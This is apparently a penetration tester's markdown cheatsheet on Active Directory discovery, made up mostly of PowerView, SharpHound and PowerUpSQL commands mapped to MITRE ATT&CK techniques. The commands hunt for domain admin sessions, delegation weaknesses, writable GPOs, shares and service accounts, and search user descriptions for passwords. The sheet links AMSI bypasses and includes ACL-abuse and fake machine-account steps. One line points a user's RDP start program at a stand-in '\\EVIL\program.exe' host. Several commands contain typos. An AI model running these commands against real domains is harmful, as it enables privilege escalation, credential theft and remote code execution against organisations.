---
layout: post
title: TA0007 Discovery - AD Collection & Enumeration
parent: Pentesting
category: Pentesting
grand_parent: Cheatsheets
modified_date: 2022-07-25
permalink: /:categories/:title/
---

<!-- vscode-markdown-toc -->
* [PRE-REQUISITES](#PRE-REQUISITES)
	* [Downloading SharpHound](#DownloadingSharpHound)
	* [Running Powershell Tools](#RunningPowershellTools)
		* [Spawn an AD account](#SpawnanADaccount)
		* [Mandiant Commando VM](#MandiantCommandoVM)
		* [Setting variables for copy/paste](#Settingvariablesforcopypaste)
		* [Handling console errors](#Handlingconsoleerrors)
		* [Bypass AMSI](#BypassAMSI)
	* [Running Bloodhound](#RunningBloodhound)
	* [AD Web Services on the DC](#ADWebServicesontheDC)
* [Data Collection with SharpHound](#DataCollectionwithSharpHound)
* [Data Enumeration](#DataEnumeration)
	* [Domain properties](#Domainproperties)
	* [Forest properties](#Forestproperties)
	* [T1087.002 Account Discovery - Domain Account](#T1087.002AccountDiscovery-DomainAccount)
		* [Domain Admin Account](#DomainAdminAccount)
		* [Other Privileged Users](#OtherPrivilegedUsers)
		* [Targeting a Computer](#TargetingaComputer)
	* [T1134.001 Token Impersonation via Delegations](#T1134.001TokenImpersonationviaDelegations)
	* [T1615 Group Policy Discovery](#T1615GroupPolicyDiscovery)
	* [T1135 Network Shares](#T1135NetworkShares)
	* [Txxx MSSQL servers](#TxxxMSSQLservers)
	* [TXXXX ACL](#TXXXXACL)
	* [T1046 SERVICES LOOTS](#T1046SERVICESLOOTS)
	* [MISC](#MISC)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='PRE-REQUISITES'></a>PRE-REQUISITES 

### <a name='DownloadingSharpHound'></a>Downloading SharpHound

- [SharpHound latest Scripts & Binary](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)

### <a name='RunningPowershellTools'></a>Running Powershell Tools

- [PowerView CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
- [PowerUPsql CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)

#### <a name='SpawnanADaccount'></a>Spawn an AD account
```powershell
runas /netonly /user:adm_x@dom.corp poweshell
powershell -ep bypass
```

#### <a name='MandiantCommandoVM'></a>Mandiant Commando VM
```powershell
cd C:\tools\PowerSploit\Recon
Import-Module ./Recon.psm1
gcm -m Recon
```

#### <a name='Settingvariablesforcopypaste'></a>Setting variables for copy/paste
```powershell
$dom = "contoso.corp"
$dom_dc = "DC01.contoso.corp"
$group = "Domain Admins"
$user = "admin"
$computer = "PC001"
$OU = "Admins"
$forest ="corp"
```

#### <a name='Handlingconsoleerrors'></a>Handling console errors
```powershell
$ErrorActionPreference = 'SilentlyContinue' # hide errors on out console
$ErrorActionPreference = 'Continue' # set back the display of the errors
```

#### <a name='BypassAMSI'></a>Bypass AMSI 
- [amsi.fails]('https://amsi.fails')
- [S3cur3Th1sSh1t]('https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell')
- [notes.offsec-journey.com]('https://notes.offsec-journey.com/evasion/amsi-bypass')

### <a name='RunningBloodhound'></a>Running Bloodhound 
```powershell
# Path for VM Mandiant Commando
# Start the Neo4J database
C:\Tools\neo4j-community\neo4j-community-3.5.1\bin>neo4j.bat console
```

### <a name='ADWebServicesontheDC'></a>AD Web Services on the DC

On the error below when loading the AD module, ADWS must be reachable and running:
- TCP port 9389 reachable from your endpoint (and listening on the DC) : ```Test-NetConnection DC01 -port 9389```
- Restart the service on the DC : ```Restart-Service –name ADWS –verbose```

For more info, read the article from [theitbros.om](https://theitbros.com/unable-to-find-a-default-server-with-active-directory-web-services-running/).

## <a name='DataCollectionwithSharpHound'></a>Data Collection with SharpHound

![SharpHound Cheatsheet](/assets/images/pen-win-ad-enum-sharphound-cheatsheet.png)

Image credit: [https://twitter.com/SadProcessor](https://twitter.com/SadProcessor)

## <a name='DataEnumeration'></a>Data Enumeration

### <a name='Domainproperties'></a>Domain properties

```powershell
nltest /dclist:$dom
Get-NetDomainController -Domain $dom

# enumerate the current domain controller policy
$DCPolicy = Get-DomainPolicy -Policy $dom_dc -Domain $dom -DomainController $dom_dc 
$DCPolicy.PrivilegeRights # user privilege rights on the dc...

# enumerate the current domain policy
$DomainPolicy = Get-DomainPolicy -Policy $dom -Domain $dom -DomainController $dom_dc 
$DomainPolicy.KerberosPolicy # useful for golden tickets
$DomainPolicy.SystemAccess # password age/etc.

# audit the permissions of AdminSDHolder, resolving GUIDs
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=<domain>,DC=local' -ResolveGUIDs -Domain $dom -DomainController $dom_dc 
```

### <a name='Forestproperties'></a>Forest properties

```powershell
# get the trusts of the current domain/forest
Get-NetDomainTrust -Domain $dom -DomainController $dom_dc 
Get-NetForestTrust -Domain $dom -DomainController $dom_dc 

# get information about an other forest
Get-NetForest -Forest $forest -DomainController $dom_dc

# find users with sidHistory set
Get-DomainUser -LDAPFilter '(sidHistory=*)' -Domain $dom -DomainController $dom_dc

```

### <a name='T1087.002AccountDiscovery-DomainAccount'></a>T1087.002 Account Discovery - Domain Account

References:
- [https://attack.mitre.org/techniques/T1087/002/](https://attack.mitre.org/techniques/T1087/002/)

#### <a name='DomainAdminAccount'></a>Domain Admin Account
```powershell
# PowerView: find where DA has logged on / and current user has access
# can be long and noisy, does net share discovery over \\machine\IPC$
Invoke-UserHunter -Domain $dom -DomainController $dom_dc 
Invoke-UserHunter -CheckAccess -Domain $dom -DomainController $dom_dc 
Invoke-UserHunter -CheckAccess -Domain $dom -DomainController $dom_dc | select username, computername, IPAddress

# get all the effective members of DA groups, 'recursing down'
Get-NetGroupMember -Identity "Domain Admins" -Domain $dom -DomainController $dom_dc -Recurse | select membername, membersid
Get-NetGroupMember -Identity "Enterprise Admins" -Domain $dom -DomainController $dom_dc -Recurse | select membername, membersid

# Find admin groups based on "adm" keyword
Get-NetGroup -Domain $dom -DomainController $dom_dc *adm* 
```

#### <a name='OtherPrivilegedUsers'></a>Other Privileged Users

- [Well-known Microsoft SID List](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab?redirectedfrom=MSDN)

```powershell
# look for the keyword "pass" in the description attribute for each user in the domain
Find-UserField -SearchField Description -SearchTerm "pass" -Domain $dom -DomainController $dom_dc

# find where the backup operators are logged on
Invoke-UserHunter -Group $group -Domain $dom -DomainControler $dom_dc | select computername, membername

# find computers where the current user is local admin
Find-LocalAdminAccess -Domain $dom -DomainController $dom_dc
sharphound.exe -c All,LoggedOn

# find local admins on all computers of the domain
Invoke-EnumerateLocalAdmin -Domain $dom -DomainController $dom_dc | select computername, membername

# get all the effective members of DA groups, 'recursing down'
Get-DomainGroupMember -Identity "Domain Computers" -Recurse -Domain $dom -DomainController $dom_dc | select membername, membersid

# enumerate who has rights to the $user in $dom, resolving rights GUIDs to names
Get-DomainObjectAcl -Identity $user -ResolveGUIDs -Domain $dom -DomainController $dom_dc 

# Find any machine accounts in privileged groups
Get-DomainGroup -AdminCount -Domain $dom -DomainController $dom_dc | Get-NetGroupMember -Recurse -Domain $dom -DomainController $dom_dc | ?{$_.MemberName -like '*$'}

# return the local group *members* of a remote server using Win32 API methods (faster but less info)
Get-NetLocalGroupMember -Method API -ComputerName <Server>.<FQDN> -Domain $dom -DomainController $dom_dc

# gather info on security groups
Get-ObjectAcl -SamAccountName "Domain Computers" -ResolveGUIDs -Verbose -Domain $dom -DomainController $dom_dc | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
Get-DomainGroupMember -Identity "Backup Operators" -Recurse -Domain $dom -DomainController $dom_dc 
Get-NetGroupMember -GroupName "RDPUsers" -Domain $dom -DomainController $dom_dc 
Invoke-ACLScanner -ResolveGUIDs -Domain $dom -DomainController $dom_dc | ?{$_.IdentityReference -match "RDPUsers"} 

```

#### <a name='TargetingaComputer'></a>Targeting a Computer
```powershell
# get actively logged users on a computer
Get-NetLoggedon -ComputerName $computer -Domain $dom -DomainController $dom_dc

# get last logged users on a computer
Get-LastLoggedon -ComputerName $computer -Domain $dom -DomainController $dom_dc

# testing accounts with empty passwords 
$mycreds = New-Object System.Management.Automation.PSCredential("<sogreat>", (new-object System.Security.SecureString))
Invoke-Command -Credential $mycreds -ComputerName $computer -ScriptBlock {whoami; hostname}

# Get the logged on users for all machines in any *server* OU in a particular domain
Get-DomainOU -Identity $computer -Domain $dom -DomainController $dom_dc | %{Get-DomainComputer -Domain $dom -DomainController $dom_dc -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_ -Domain $dom -DomainController $dom_dc}}

# return the local *groups* of a remote server
Get-NetLocalGroup $computer -Domain $dom -DomainController $dom_dc
```
### <a name='T1134.001TokenImpersonationviaDelegations'></a>T1134.001 Token Impersonation via Delegations

References :
- [https://attack.mitre.org/techniques/T1134/001/](https://attack.mitre.org/techniques/T1134/001/)

```powershell
# enumerate all computers that allow unconstrained delegation, and all privileged users that aren't marked as sensitive/not for delegation
Get-DomainComputer -Unconstrained -Domain $dom -DomainController $dom_dc 
Get-DomainUser -AllowDelegation -AdminCount -Domain $dom -DomainController $dom_dc 

# Find-DomainUserLocation == old Invoke-UserHunter
# enumerate servers that allow unconstrained Kerberos delegation and show all users logged in
Find-DomainUserLocation -ComputerUnconstrained -ShowAll -Domain $dom -DomainController $dom_dc 

# hunt for admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation -Domain $dom -DomainController $dom_dc 
```

### <a name='T1615GroupPolicyDiscovery'></a>T1615 Group Policy Discovery

- [https://attack.mitre.org/techniques/T1615/](https://attack.mitre.org/techniques/T1615/)

```powershell
# find users who have local admin rights
Find-GPOComputerAdmin -ComputerName $computer -Domain $dom -DomainController $dom_dc 
Get-NetOU $OU -Domain $dom -DomainController $dom_dc | %{Get-NetComputer -ADSPath $_ -Domain $dom -DomainController $dom_dc}

# find users who have local admin rights
Find-GPOLocation -UserName $user -Domain $dom -DomainController $dom_dc

# list users that can reset password
Get-NetGPO -Domain $dom -DomainController $dom_dc | %{Get-ObjectAcl -ResolveGUISs -Name $_.Name -RightsFilter "ResetPassword" -Domain $dom -DomainController $dom_dc }

# list users and GPO he can modifiy
Get-NetGPO -Domain $dom -DomainController $dom_dc | %{Get-ObjectAcl -ResolveGUISs -Name $_.Name -Domain $dom -DomainController $dom_dc }

# retrieve all the computer dns host names a GPP password applies to
Get-DomainOU -GPLink '<GPP_GUID>' -Domain $dom -DomainController $dom_dc | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname -Domain $dom -DomainController $dom_dc}

# enumerate what machines that a particular user/group identity has local admin rights to
#   Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation
Get-DomainGPOUserLocalGroupMapping -Identity $user -Domain $dom -DomainController $dom_dc 
Get-DomainGPOUserLocalGroupMapping -Identity $group -Domain $dom -DomainController $dom_dc 

# enumerate what machines that a given user in the specified domain has RDP access rights to
Get-DomainGPOUserLocalGroupMapping -LocalGroup RDP -Identity $user -Domain $dom -DomainController $dom_dc 
Get-DomainGPOUserLocalGroupMapping -LocalGroup RDP -Identity $group -Domain $dom -DomainController $dom_dc 

# export a csv of all GPO mappings
Get-DomainGPOUserLocalGroupMapping -Domain $dom -DomainController $dom_dc | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv

# find all policies applied to a computer/server
Get-DomainGPO -ComputerIdentity $computer -Domain $dom -DomainController $dom_dc

# Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' -Domain $dom -DomainController $dom_dc  | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
```

### <a name='T1135NetworkShares'></a>T1135 Network Shares

References:
- [https://attack.mitre.org/techniques/T1135](https://attack.mitre.org/techniques/T1135/)

```powershell
# find share folders in the domain
Invoke-ShareFinder -Domain $dom -DomainController $dom_dc

# use alternate credentials for searching for files on the domain
#   Find-InterestingDomainShareFile == old Invoke-FileFinder
$Password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential("<Domain>\user",$Password)
Find-InterestingDomainShareFile -Domain $dom -DomainController $dom_dc -Credential $Credential
```

### <a name='TxxxMSSQLservers'></a>Txxx MSSQL servers

References:
- [https://attack.mitre.org/techniques/T1135](https://attack.mitre.org/techniques/T1135/)

```powershell
# Invoke-UserHunter -UserIdentity dba_admin > mssql_instances_shorted.txt
# sed 's/MSSQLSvc\/\([a-z,A-Z,0-9]*\)\(\.contoso\.corp:\|:\)\?\(.*\)/\1/g' mssql_instances_shorted.txt | sort -u > mssql_servers_shorted.txt
# get-content mssql_servers_shorted.txt | get-netcomputer -Identity $_ -properties cn,description,OperatingSystem,OperatingSystemVersion,isCriticalSystemObject

 Get-SQLInstanceDomain -Verbose -DomainController $dom_dc -Username CONTOSO\mssql_admin -password Password01 > mssql_instances.txt
```

### <a name='TXXXXACL'></a>TXXXX ACL

References:
- [https://attack.mitre.org/techniques/T1135](https://attack.mitre.org/techniques/T1135/)

```powershell
# requirement : MAchineAccountQuota / possibility to create a new computer
get-netuser | select-first 1 #get the domain's distinguisedname attribute 
get-netobject -identity 'DC=contoso,DC,corp'
# requirement : DC > win 2012
get-domaincontroller | select name.osversion | fl
# requirement  : check constraint delegation setting on the target computer 
getnetcomputer $computer | select name,msds-allowedtoactonbehalfofotheridentity | fl

# Target Computer Name : $computer
# Admin on Target Computer : right click on the object in bloodhound
# Fake Computer Name : fakecomputer
# Fake Computer SID : get-netcomputer fakecomputer | select samaccountname,objectsid
# Fake Computer password : Password123

new-machineaccount MachineAccount fakecomputer -Password $(Convertto-securestring 'Password123' -AsPlainText -Force)


# list users/groups ACLs
# valuable attributes: IdentityReference, ObjectDN, ActiveDirectoryRights
Get-ObjectAcl -SamAccountName <User>-ResolveGUIDs -Domain $dom -DomainController $dom_dc 

# grant user 'will' the rights to change 'matt's password
Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Domain $dom -DomainController $dom_dc  -Verbose

```

### <a name='T1046SERVICESLOOTS'></a>T1046 SERVICES LOOTS

References:
- [https://attack.mitre.org/techniques/T1046](https://attack.mitre.org/techniques/T1046/)

```powershell
# find all users with an SPN set (likely service accounts)
Get-DomainUser -SPN -Domain $dom -DomainController $dom_dc | select name, description, lastlogon, badpwdcount, logoncount, useraccountcontrol, memberof
sed 's/MSSQLSvc\/\([a-z,A-Z,0-9]*\)\(\.contoso\.corp:\|:\)\?\(.*\)/\1/g' mssql_instances_shorted.txt | sort -u > mssql_servers_shorted.txt

# find all service accounts in "Domain Admins"
Get-DomainUser -SPN -Domain $dom -DomainController $dom_dc | ?{$_.memberof -match 'Domain Admins'}

# find all Win2008 R2 computers (likely servers) and IP/ICMP reachable
Get-NetComputer -OperatingSystem "Windows 2008*" -Ping -Domain $dom -DomainController $dom_dc 
```

### <a name='MISC'></a>MISC
```powershell
# get all the groups a user is effectively a member of, 'recursing up' using tokenGroups
Get-DomainGroup -MemberIdentity $user -Domain $dom -DomainController $dom_dc 
Get-DomainGroup -MemberIdentity $group -Domain $dom -DomainController $dom_dc 

# all enabled users, returning distinguishednames
Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname -Domain $dom -DomainController $dom_dc 
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname -Domain $dom -DomainController $dom_dc 

# all disabled users
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)" -Domain $dom -DomainController $dom_dc 
Get-DomainUser -UACFilter ACCOUNTDISABLE -Domain $dom -DomainController $dom_dc 

# use multiple identity types for any *-Domain* function
'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dagreat,CN=Users,DC=<Domain>,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff -Domain $dom -DomainController $dom_dc 

# find all computers in a given OU
Get-DomainComputer -SearchBase "ldap://OU=..." -Domain $dom -DomainController $dom_dc 

# enumerate all gobal catalogs in the forest
Get-ForestGlobalCatalog -Domain $dom -DomainController $dom_dc 

# turn a list of computer short names to FQDNs, using a global catalog
gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname -Domain $dom -DomainController $dom_dc }

# save a PowerView object to disk for later usage
Get-DomainUser -Domain $dom -DomainController $dom_dc | Export-Clixml user.xml
$Users = Import-Clixml user.xml

# enumerate all groups in a domain that don't have a global scope, returning just group names
Get-DomainGroup -GroupScope NotGlobal -Properties name -Domain $dom -DomainController $dom_dc 

# enumerates computers in the current domain with 'outlier' properties, i.e. properties not set from the firest result returned by Get-DomainComputer
Get-DomainComputer -FindOne -Domain $dom -DomainController $dom_dc | Find-DomainObjectPropertyOutlier

# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose -Domain $dom -DomainController $dom_dc 

# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity $user -Domain $dom -DomainController $dom_dc 

```